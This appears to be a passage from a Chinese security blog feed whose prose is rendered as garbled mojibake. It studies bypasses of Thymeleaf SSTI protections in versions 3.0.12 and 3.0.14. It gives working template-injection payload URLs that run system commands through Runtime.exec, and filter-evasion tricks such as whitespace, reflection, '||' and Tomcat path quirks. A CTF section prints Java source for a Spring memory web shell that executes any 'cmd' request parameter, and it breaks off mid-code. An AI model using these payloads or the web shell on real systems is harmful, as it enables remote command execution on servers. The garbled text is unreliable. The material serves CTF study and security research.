    <summary type="html">&lt;p&gt;2024å¹´æœ€åä¸€æ¬¡çš„dasï¼Œwebç»ˆäºä¹Ÿæ˜¯æ²¡æœ‰çˆ†é›¶äº†ï¼Œæœ€åä¸€é¢˜çš„1è§£é¢˜çœ‹äº†gxnå¤§å“¥çš„wpä¹Ÿæ˜¯å­¦åˆ°æ–°ä¸œè¥¿äº†ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹&lt;/p&gt;
&lt;p&gt;å®˜æ–¹wpï¼š&lt;a href=&quot;https://www.yuque.com/chuangfeimeiyigeren/eeii37/oxv3ga</summary>
      
    
    
    
    <category term="wp" scheme="https://clowsman.github.io/categories/wp/"/>
    
    
    <category term="wp" scheme="https://clowsman.github.io/tags/wp/"/>
    
    <category term="ctf" scheme="https://clowsman.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>å†çœ‹Thymeleaf</title>
    <link href="https://clowsman.github.io/2024/12/14/%E5%86%8D%E7%9C%8BThymeleaf/"/>
    <id>https://clowsman.github.io/2024/12/14/%E5%86%8D%E7%9C%8BThymeleaf/</id>
    <published>2024-12-14T06:40:45.000Z</published>
    <updated>2024-12-14T16:21:39.708Z</updated>
    
    <content type="html"><![CDATA[<p>å†æ¥æ°´ä¸€ç¯‡Thymeleafçš„sstiï¼Œèµ·å› æ˜¯çœ‹åˆ°å¸ˆå…„ä»¥å‰å‡ºçš„é¢˜ç›®ï¼Œé‡Œé¢æœ‰ä¸€ç‚¹å°å‘ï¼Œç´¢å¼•å°±æŠŠThymeleafç¨å¾®é«˜ç‰ˆæœ¬ä¸€äº›çš„æ¼æ´å†è®°å½•ä¸€ä¸‹</p><h1 id="thymeleafé«˜ç‰ˆæœ¬åˆ©ç”¨"><a href="#thymeleafé«˜ç‰ˆæœ¬åˆ©ç”¨" class="headerlink" title="thymeleafé«˜ç‰ˆæœ¬åˆ©ç”¨"></a>thymeleafé«˜ç‰ˆæœ¬åˆ©ç”¨</h1><p>ä¸Šä¸€ç¯‡æ–‡ç« åªè¯´äº†3.0.11ç‰ˆæœ¬ä¹‹å‰çš„åˆ©ç”¨ï¼Œåå‡ ä¸ªç‰ˆæœ¬çš„åˆ©ç”¨æ–¹å¼å‘ç”Ÿäº†å˜åŒ–ï¼Œè®°å½•ä¸€ä¸‹</p><p>thymeleafå’Œspringbootå¯¹åº”çš„ç‰ˆæœ¬</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">SpringBoot     Thymeleaf<br>2.2.0.RELEASE  3.0.11<br>2.4.10         3.0.12<br>2.7.18         3.0.15<br>3.0.8          3.1.1<br>3.2.2          3.1.2<br></code></pre></td></tr></table></figure><h2 id="3012ç‰ˆæœ¬åˆ©ç”¨"><a href="#3-0-12ç‰ˆæœ¬åˆ©ç”¨" class="headerlink" title="3.0.12ç‰ˆæœ¬åˆ©ç”¨"></a>3.0.12ç‰ˆæœ¬åˆ©ç”¨</h2><p>æ‰“ä¸€ä¸‹åŸæ¥çš„payloadçœ‹çœ‹æŠ¥é”™</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/doc/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d__::.x<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241214152746494.png" alt="image-20241214152746494"></p><p>å¯ä»¥çœ‹åˆ°ä»–è¯†åˆ«å‡ºäº†è¡¨è¾¾å¼å¹¶ç¦æ­¢äº†è¡¨è¾¾å¼æ‰§è¡Œï¼Œæˆ‘ä»¬å¯ä»¥ä»è°ƒç”¨å †æ ˆçœ‹åˆ°ä»–æŠ¥é”™çš„åœ°æ–¹ï¼Œåœ¨SpringRequestUtils.checkViewNameNotInRequestå‡½æ•°é‡Œé¢ï¼Œè¿™æ˜¯åœ¨ThymeleafView#renderFragmenté‡Œé¢æ–°å¢çš„å¤„ç†æ–¹æ³•ï¼Œæˆ‘ä»¬å»çœ‹çœ‹ï¼Œå…¶æºç å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkViewNameNotInRequest</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String viewName, <span class="hljs-keyword">final</span> HttpServletRequest request)</span> &#123;<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">vn</span> <span class="hljs-operator">=</span> StringUtils.pack(viewName);<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">requestURI</span> <span class="hljs-operator">=</span> StringUtils.pack(UriEscape.unescapeUriPath(request.getRequestURI()));<br><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">found</span> <span class="hljs-operator">=</span> (requestURI != <span class="hljs-literal">null</span> &amp;&amp; requestURI.contains(vn));<br>        <span class="hljs-keyword">if</span> (!found) &#123;<br>            <span class="hljs-keyword">final</span> Enumeration&lt;String&gt; paramNames = request.getParameterNames();<br>            String[] paramValues;<br>            String paramValue;<br>            <span class="hljs-keyword">while</span> (!found &amp;&amp; paramNames.hasMoreElements()) &#123;<br>                paramValues = request.getParameterValues(paramNames.nextElement());<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; !found &amp;&amp; i &lt; paramValues.length; i++) &#123;<br>                    paramValue = StringUtils.pack(UriEscape.unescapeUriQueryParam(paramValues[i]));<br>                    <span class="hljs-keyword">if</span> (paramValue.contains(vn)) &#123;<br>                        found = <span class="hljs-literal">true</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (found) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplateProcessingException</span>(<br>                    <span class="hljs-string">&quot;View name is an executable expression, and it is present in a literal manner in &quot;</span> +<br>                    <span class="hljs-string">&quot;request path or parameters, which is forbidden for security reasons.&quot;</span>);<br>        &#125;<br><br>    &#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è°ƒè¯•çœ‹ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241214153327162.png" alt="image-20241214153327162"></p><p>è¿™é‡Œå¦‚æœç»è¿‡å¤„ç†åçš„requestURIåŒ…å«vnï¼Œå°±ä¼šåœ¨ä¸‹é¢æŠ›å‡ºå¼‚å¸¸</p><p><code>StringUtils.pack()</code> çš„ä½œç”¨æ˜¯å»æ‰å­—ç¬¦ä¸²çš„ç©ºæ ¼å’Œ <code>ASCII</code> ç åœ¨ç©ºæ ¼ä¹‹å‰çš„ç‰¹æ®Šå­—ç¬¦ï¼Œå¹¶æœ€åè½¬ä¸ºå°å†™ã€‚ç„¶åå°±æ˜¯å…ˆçœ‹ <code>uri</code> ä¸­æ˜¯å¦å­˜åœ¨ <code>viewName</code> ï¼ˆè¿™ä¸€æ­¥æ˜¯ä¸ºäº†æ£€æŸ¥ <code>restful</code> é£æ ¼çš„å‚æ•°æ˜¯å¦åŒ…å«äº† <code>viewName</code> ï¼‰ï¼Œç„¶åéå† <code>url</code> ä¸­çš„å‚æ•°ï¼ˆ <code>?key=value</code> çš„éƒ¨åˆ† ï¼‰æ˜¯å¦åŒ…å«äº† <code>viewName</code> ï¼ˆè¿™ä¸€æ­¥æ£€æŸ¥çš„æ˜¯æ™®é€šçš„å‚æ•°ï¼‰ï¼Œå¦‚æœä¸Šè¿°ä»»æ„å…¶ä¸€åŒ…å«äº† <code>vn</code> å°±æŠ¥é”™ã€‚æ­£å¯¹åº”è¿™ä¸ªæ–¹æ³•åï¼Œæ£€æŸ¥ <code>viewName</code> æ˜¯å¦åœ¨ <code>request</code> å¯¹è±¡ä¸­ã€‚</p><p>ä½†æ˜¯æˆ‘ä»¬è¿™é‡Œç”¨çš„æ˜¯ä¼ è·¯å¾„é‚£ä¸ªdemoå¯¼è‡´ifåˆ¤æ–­éƒ½æ²¡è¿›å»å°±æŠ¥é”™äº†</p><p>æ‰€ä»¥è¿™ç§åœºæ™¯ä¸‹çš„sstiå°±è¢«é˜²å¾¡ä½äº†</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/doc/&#123;document&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getDocument</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String document)</span> &#123;<br>        log.info(<span class="hljs-string">&quot;Retrieving &quot;</span> + document);<br>        <span class="hljs-comment">//returns void, so view name is taken from URI</span><br>    &#125;<br></code></pre></td></tr></table></figure><p>ä½†ä¸‹é¢è¿™ç§æ‹¼æ¥çš„åœºæ™¯è¿˜æ˜¯å¯ä»¥ç»•è¿‡çš„</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/path&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">path</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String lang)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;user/&quot;</span> + lang + <span class="hljs-string">&quot;/welcome&quot;</span>; <span class="hljs-comment">//template path is tainted</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è°ƒè¯•æ¥çœ‹</p><p><img src="https://cdn.clown2024.cn/image-20241214155011988.png" alt="image-20241214155011988"></p><p>è¿™é‡Œçš„è·¯ç”±å°±æ— æ³•åŒ…å«è§†å›¾åäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¿›å…¥åˆ°ifåˆ¤æ–­é‡Œé¢</p><p>ç„¶åå¯¹æˆ‘ä»¬çš„å‚æ•°å€¼è¿›è¡Œå¤„ç†ï¼Œç”¨UriEscape.unescapeUriQueryParamæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241214155518722.png" alt="image-20241214155518722"></p><p>ä½†ç»è¿‡å¤„ç†ä¹‹åä¾æ—§æ˜¯ä¸ä¼šåŒ…å«vnçš„</p><p><img src="https://cdn.clown2024.cn/image-20241214155957921.png" alt="image-20241214155957921"></p><p>æ‰€ä»¥checkViewNameNotInRequestå°±å·²ç»ç»•è¿‡äº†ï¼Œè¿™ç§åœºæ™¯å¹¶ä¸éœ€è¦æˆ‘ä»¬æ”¹payloadï¼Œç”¨åŸæ¥çš„å°±å¯ä»¥äº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/path?lang=__$%7bT(java.lang.Runtime).getRuntime().exec(%22calc%22).getInputStream()%7d__::.x<br></code></pre></td></tr></table></figure><p>è¿˜æœ‰å¦ä¸€ç§æ‹¼æ¥çš„åœºæ™¯</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/doc1/&#123;data&#125;&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">demo4</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String data)</span> &#123;<br>    System.out.println(data);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;clown/&quot;</span> + data;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„pocæ˜¯è¿™æ ·çš„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/doc1/;/__$%7BT(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)%7D__::<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ç»•è¿‡åŸç†å’Œtomcatçš„urlè§£æç‰¹æ€§ç›¸å…³ï¼Œç›®çš„æ˜¯ä¸ºäº†ä¸èƒ½è®©è§†å›¾çš„åå­—å’Œ path ä¸€è‡´ï¼Œç›¸å…³åŸç†è¿™é‡Œå°±ä¸åˆ†æäº†ï¼Œçœ‹çœ‹ç½‘ä¸Šçš„æ–‡ç« å°±å¥½ï¼Œç»•è¿‡çš„æ–¹å¼é™¤äº†ä¸Šé¢çš„å†™æ³•è¿˜æœ‰ä¸‹é¢å‡ ç§</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/doc1//<br>/doc1;/<br>/doc1/;/<br></code></pre></td></tr></table></figure><p>è¯¥ç‰¹æ€§ä¹Ÿå¯ä»¥ç”¨åœ¨ä¸€äº›æƒé™ç»•è¿‡ä¸Šé¢</p><p>ä½†å…¶å®ä¸Šé¢çš„payloadè¿˜æ˜¯æ‰“ä¸é€šï¼Œæˆ‘ä»¬ä¼šé‡åˆ°è¿™æ ·ä¸€ä¸ªé”™è¯¯</p><p><img src="https://cdn.clown2024.cn/image-20241214162453416.png" alt="image-20241214162453416"></p><p>ç›´æ¥è¯´æˆ‘ä»¬template nameä¸åˆæ³•äº†ï¼Œè¿™æ˜¯æ€ä¹ˆå›äº‹å‘¢</p><p>è¿™æ˜¯å› ä¸ºåé¢è¿˜æœ‰æ–°å¢çš„ <code>SpringStandardExpressionUtils</code>ç±» çš„æ£€æŸ¥ï¼Œè°ƒç”¨containsSpELInstantiationOrStaticæ–¹æ³•æ£€æŸ¥æˆ‘ä»¬çš„è¡¨è¾¾å¼</p><p><img src="https://cdn.clown2024.cn/image-20241214163751121.png" alt="image-20241214163751121"></p><p>æºç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">containsSpELInstantiationOrStatic</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String expression)</span> &#123;<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * Checks whether the expression contains instantiation of objects (&quot;new SomeClass&quot;) or makes use of</span><br><span class="hljs-comment">         * static methods (&quot;T(SomeClass)&quot;) as both are forbidden in certain contexts in restricted mode.</span><br><span class="hljs-comment">         */</span><br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">explen</span> <span class="hljs-operator">=</span> expression.length();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> explen;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">ni</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// index for computing position in the NEW_ARRAY</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">si</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br>        <span class="hljs-type">char</span> c;<br>        <span class="hljs-keyword">while</span> (n-- != <span class="hljs-number">0</span>) &#123;<br><br>            c = expression.charAt(n);<br><br>            <span class="hljs-comment">// When checking for the &quot;new&quot; keyword, we need to identify that it is not a part of a larger</span><br>            <span class="hljs-comment">// identifier, i.e. there is whitespace after it and no character that might be a part of an</span><br>            <span class="hljs-comment">// identifier before it.</span><br>            <span class="hljs-keyword">if</span> (ni &lt; NEW_LEN<br>                    &amp;&amp; c == NEW_ARRAY[ni]<br>                    &amp;&amp; (ni &gt; <span class="hljs-number">0</span> || ((n + <span class="hljs-number">1</span> &lt; explen) &amp;&amp; Character.isWhitespace(expression.charAt(n + <span class="hljs-number">1</span>))))) &#123;<br>                ni++;<br>                <span class="hljs-keyword">if</span> (ni == NEW_LEN &amp;&amp; (n == <span class="hljs-number">0</span> || !Character.isJavaIdentifierPart(expression.charAt(n - <span class="hljs-number">1</span>)))) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// we found an object instantiation</span><br>                &#125;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (ni &gt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-comment">// We &#x27;restart&#x27; the matching counter just in case we had a partial match</span><br>                n += ni;<br>                ni = <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">if</span> (si &lt; n) &#123;<br>                    <span class="hljs-comment">// This has to be restarted too</span><br>                    si = -<span class="hljs-number">1</span>;<br>                &#125;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br><br>            ni = <span class="hljs-number">0</span>;<br><br>            <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;)&#x27;</span>) &#123;<br>                si = n;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (si &gt; n &amp;&amp; c == <span class="hljs-string">&#x27;(&#x27;</span><br>                        &amp;&amp; ((n - <span class="hljs-number">1</span> &gt;= <span class="hljs-number">0</span>) &amp;&amp; (expression.charAt(n - <span class="hljs-number">1</span>) == <span class="hljs-string">&#x27;T&#x27;</span>))<br>                        &amp;&amp; ((n - <span class="hljs-number">1</span> == <span class="hljs-number">0</span>) || !Character.isJavaIdentifierPart(expression.charAt(n - <span class="hljs-number">2</span>)))) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (si &gt; n &amp;&amp; !(Character.isJavaIdentifierPart(c) || c == <span class="hljs-string">&#x27;.&#x27;</span>)) &#123;<br>                si = -<span class="hljs-number">1</span>;<br>            &#125;<br><br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    &#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸»è¦é€»è¾‘æ˜¯é¦–å…ˆå€’åºæ£€æµ‹æ˜¯å¦åŒ…å« <code>wen</code>å…³é”®å­—ã€åœ¨<code>(</code>çš„å·¦è¾¹çš„å­—ç¬¦æ˜¯å¦æ˜¯<code>T</code>ï¼Œå¦‚åŒ…å«ï¼Œé‚£ä¹ˆè®¤ä¸ºæ‰¾åˆ°äº†ä¸€ä¸ªå®ä¾‹åŒ–å¯¹è±¡ï¼Œè¿”å›<code>true</code>ï¼Œé˜»æ­¢è¯¥è¡¨è¾¾å¼çš„æ‰§è¡Œã€‚</p><p>å› æ­¤è¦ç»•è¿‡è¿™ä¸ªå‡½æ•°ï¼Œåªè¦æ»¡è¶³ä¸‰ç‚¹ï¼š</p><ol><li>è¡¨è¾¾å¼ä¸­ä¸èƒ½å«æœ‰å…³é”®å­—<code>new</code>(å› ä¸ºwenå€’å™è¿‡æ¥å°±æ˜¯newäº†)</li><li>åœ¨<code>(</code>çš„å·¦è¾¹çš„å­—ç¬¦ä¸èƒ½æ˜¯<code>T</code></li><li>ä¸èƒ½åœ¨<code>T</code>å’Œ<code>(</code>ä¸­é—´æ·»åŠ çš„å­—ç¬¦ä½¿å¾—åŸè¡¨è¾¾å¼å‡ºç°é—®é¢˜</li></ol><p>è¿™é‡Œåœ¨ <code>T</code> å’Œ <code>(</code> ä¹‹é—´åŠ ä¸Šç©ºæ ¼ <code>%20</code> å°±å¯ä»¥ç»•è¿‡ï¼Œå…¶ä½™è¿˜æœ‰å¾ˆå¤šå­—ç¬¦éƒ½å¯ä»¥ã€‚ä¾‹å¦‚æ¢è¡Œç¬¦ <code>%0a</code> ï¼Œåˆ¶è¡¨ç¬¦ <code>%09</code> ã€‚</p><p>newçš„ç»•è¿‡å¯ä»¥åœ¨newåé¢åŠ ä¸ª.ä¹Ÿèƒ½è§£ææ¥ç»•è¿‡ï¼Œæˆ–è€…ç”¨å‰é¢æ–‡ç« è¯´è¿‡çš„åå°„æ¥ç»•è¿‡ï¼Œæˆ–è€…å¤§å°å†™ä¹Ÿèƒ½ç»•è¿‡</p><p><img src="https://cdn.clown2024.cn/image-20241214170720029.png" alt="image-20241214170720029"></p><h2 id="3014ç‰ˆæœ¬åˆ©ç”¨"><a href="#3-0-14ç‰ˆæœ¬åˆ©ç”¨" class="headerlink" title="3.0.14ç‰ˆæœ¬åˆ©ç”¨"></a>3.0.14ç‰ˆæœ¬åˆ©ç”¨</h2><p>è¯¥ç‰ˆæœ¬å¯¹å¯¹<code>T</code>å’Œ<code>()</code>ä¸­é—´ç©ºå­—ç¬¦è¿›è¡Œç»•è¿‡ä¿®å¤ï¼ŒåŸæ¥çš„ç©ºæ ¼%20æ²¡æ³•ç»•è¿‡äº†ï¼Œå¯ä»¥ç”¨åå°„ç»•è¿‡</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">land=__$&#123;<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).getMethod(<span class="hljs-string">&#x27;exec&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>.getClass()).invoke(<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).getMethod(<span class="hljs-string">&#x27;getRuntime&#x27;</span>).invoke(<span class="hljs-literal">null</span>),<span class="hljs-string">&#x27;calc&#x27;</span>)&#125;__::<br></code></pre></td></tr></table></figure><p>è¯¥ç‰ˆæœ¬è¿˜å¯¹<code>checkViewNameNotInRequest()</code>æ£€æµ‹å‡½æ•°ä¹Ÿè¿›è¡Œäº†å®Œå–„ï¼š<br>è¦æ±‚ <code>URI</code> çš„å€¼å’Œå…¶ <code>get</code> å‚æ•°åœ¨ <code>StringUtils.pack()</code> ä¹‹åä¸èƒ½å‡ºç° <code>$</code> ï¼Œ<code>*</code> ï¼Œ<code>#</code> ï¼Œ<code>@</code> ï¼Œ<code>~</code> ç´§è·Ÿ <code>&#123;</code> çš„æƒ…å†µã€‚</p><p><img src="https://cdn.clown2024.cn/image-20241214173543160.png" alt="image-20241214173543160"></p><p><img src="https://cdn.clown2024.cn/image-20241214173551685.png" alt="image-20241214173551685"></p><p>ç»•è¿‡æ€è·¯å°±æ˜¯ä¸ä½¿ç”¨<code>$&#123;&#125;</code>æˆ–åœ¨<code>$&#123;</code>ä¹‹é—´åŠ ç‚¹å­—ç¬¦é€ æˆç»•è¿‡ï¼Œæ–‡ç« ä¸­ä½¿ç”¨||å­—ç¬¦æ¥ç»•è¿‡ï¼ŒåŸå› æ˜¯Thymeleaf3.0.15.RELEASEç‰ˆæœ¬ä¹‹å‰<code>LiteralSubstitutionUtil()</code>å‡½æ•°ä¼šç½®ç©º<code>||</code>å­—ç¬¦ï¼Œå…·ä½“çœ‹çœ‹å¸ˆå‚…çš„æ–‡ç« å°±å¥½äº†ï¼š<a href="https://cn-sec.com/archives/3118198.html">https://cn-sec.com/archives/3118198.html</a></p><p>æœ€åç»•è¿‡payloadåŠ ä¸ª||å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">lang=__$||&#123;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;exec&#x27;,&#x27;&#x27;.getClass()).invoke(&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;getRuntime&#x27;).invoke(null),&#x27;open -a calculator.app&#x27;)&#125;__::<br></code></pre></td></tr></table></figure><h2 id="å…¶ä»–ç‰ˆæœ¬"><a href="#å…¶ä»–ç‰ˆæœ¬" class="headerlink" title="å…¶ä»–ç‰ˆæœ¬"></a>å…¶ä»–ç‰ˆæœ¬</h2><p>ä»Thymeleaf3.0.15ç‰ˆæœ¬å¼€å§‹åˆ°ç°åœ¨æœ€æ–°3.1.2.RELEASEç‰ˆæœ¬ï¼Œå°±æ˜¯é’ˆå¯¹Htmlæ–‡ä»¶åˆ©ç”¨ä¸åœçš„æ·»åŠ é»‘åå•äº†ï¼Œè¿™äº›å°±éœ€è¦è‡ªå·±å†å»ç ”ç©¶äº†</p><p>å¸ˆå‚…çš„æ–‡ç« ä¸­æåˆ°æœ€æ–°ç‰ˆæœ¬ruoyiä½¿ç”¨çš„Thymeleaf3.0.15ä¹Ÿæ˜¯å¯ä»¥æ‰“çš„ï¼Œä»¥åæœ‰æœºä¼šçœ‹çœ‹ï¼ˆ</p><h1 id="2022ç½‘é¼æ¯-ç„æ­¦ç»„findit"><a href="#2022ç½‘é¼æ¯-ç„æ­¦ç»„-FindIT" class="headerlink" title="[2022ç½‘é¼æ¯ ç„æ­¦ç»„]FindIT"></a>[2022ç½‘é¼æ¯ ç„æ­¦ç»„]FindIT</h1><p>å› ä¸ºæ²¡æœ‰ç¯å¢ƒå°±çœ‹ç½‘ä¸Šwpæ¢³ç†ä¸€ä¸‹è€ƒç‚¹</p><p>è¯¥é¢˜ç›®çš„è€ƒç‚¹å¦‚ä¸‹ï¼š<br>1ã€thymeleaf SSTI æ¼æ´åŸç†<br>2ã€thymeleaf SSTIæ¼æ´ä¿®å¤ç»•è¿‡æŠ€å·§<br>3ã€Springå†…å­˜é©¬ç¼–å†™<br>4ã€Apache Tomcat 9 url åŒ…å«ç‰¹æ®Šå­—ç¬¦ï¼Œä¾‹å¦‚ &#x2F;ã€[]å¤„ç†ä¸æ›¿ä»£</p><p>è¿™é¢˜æ‰“çš„æ˜¯3.0.12çš„Thymeleafï¼Œå°±ç”¨å‰é¢æ–‡ç« è¯´è¿‡çš„å†…å­˜é©¬å°±å¯ä»¥ç›´æ¥æ‰“äº†ï¼Œå› ä¸ºå‰é¢copyè¿‡æ¥çš„æ—¶å€™å·²ç»æ˜¯æˆå“äº†ï¼Œä¸è¿‡è¿™é‡Œå‚ç…§ä¸€ä¸‹è¿™ç¯‡æ–‡ç« çœ‹çœ‹æ˜¯æ€ä¹ˆæ„é€ å‡ºæ¥çš„ï¼š<a href="https://xz.aliyun.com/t/11688?time__1311=Cq0xRQKQq7qmqGNDQiiQqPGI3oLfObQWa4D">https://xz.aliyun.com/t/11688?time__1311=Cq0xRQKQq7qmqGNDQiiQqPGI3oLfObQWa4D</a></p><p>å…ˆæ˜¯æ³¨å…¥å†…å­˜é©¬çš„exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.http.HttpStatus;<br><span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringRequestMappingMemshell</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">doInject</span><span class="hljs-params">(Object requestMappingHandlerMapping)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;inject-start&quot;</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">registerMapping</span> <span class="hljs-operator">=</span> requestMappingHandlerMapping.getClass().getMethod(<span class="hljs-string">&quot;registerMapping&quot;</span>, Object.class, Object.class, Method.class);<br>            registerMapping.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">executeCommand</span> <span class="hljs-operator">=</span> SpringRequestMappingMemshell.class.getDeclaredMethod(<span class="hljs-string">&quot;executeCommand&quot;</span>, String.class);<br>            <span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">patternsRequestCondition</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/*&quot;</span>);<br>            <span class="hljs-type">RequestMethodsRequestCondition</span> <span class="hljs-variable">methodsRequestCondition</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMethodsRequestCondition</span>();<br>            <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">requestMappingInfo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(patternsRequestCondition, methodsRequestCondition, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>            registerMapping.invoke(requestMappingHandlerMapping, requestMappingInfo, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpringRequestMappingMemshell</span>(), executeCommand);<br>            msg = <span class="hljs-string">&quot;inject-success&quot;</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            msg = <span class="hljs-string">&quot;inject-error&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> msg;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> ResponseEntity <span class="hljs-title function_">executeCommand</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(value = &quot;cmd&quot;)</span> String cmd)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">execResult</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next();<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseEntity</span>(execResult, 